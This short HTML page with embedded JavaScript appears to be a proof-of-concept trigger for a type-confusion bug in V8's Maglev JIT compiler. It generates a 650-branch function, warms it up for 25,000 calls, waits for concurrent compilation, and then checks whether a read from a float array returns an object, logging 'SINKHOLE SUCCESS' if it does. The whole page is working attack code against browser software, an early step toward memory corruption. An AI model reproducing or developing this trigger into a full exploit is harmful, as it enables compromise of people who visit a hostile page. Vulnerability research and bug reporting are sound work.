<!DOCTYPE html><html><body><script>
N_BLOCKS = 650;
let lines = [];
lines.push("function trigger(x, arr, obj) {");
for (let i = 0; i < N_BLOCKS; i++) {
  lines.push(`  if (x === ${i}) return ${i};`);
}
lines.push("  arr[0] = obj;");
lines.push("  let res = 0;");
lines.push("  let i = 0;");
lines.push("  while (i < 1) {");
lines.push("    res = arr[1];");
lines.push("    i++;");
lines.push("  }");
lines.push("  return res;");
lines.push("}");
lines.push("return trigger;");

let trigger = new Function(lines.join("\n"))();

let dummy = { a: 1 };

async function main() {
  console.log("Starting warmup...");
  for (let i = 0; i < 25000; i++) {
    let a = [1.1, 2.2, 3.3];
    trigger(i, a, dummy);
  }
  console.log("Warmup loop complete, waiting 2s for concurrent Maglev compilation...");
  await new Promise(r => setTimeout(r, 2000));

  console.log("Calling trigger AFTER Maglev compilation...");
  let farr = [1.1, 2.2, 3.3];
  let res = trigger(1000, farr, dummy);
  console.log("res type:", typeof res, "res:", res);
  if (typeof res === "object") {
    console.log("=== SINKHOLE SUCCESS! Got object:", res, "===");
  } else {
    console.log("res is still:", res);
  }
}
main();
</script></body></html>
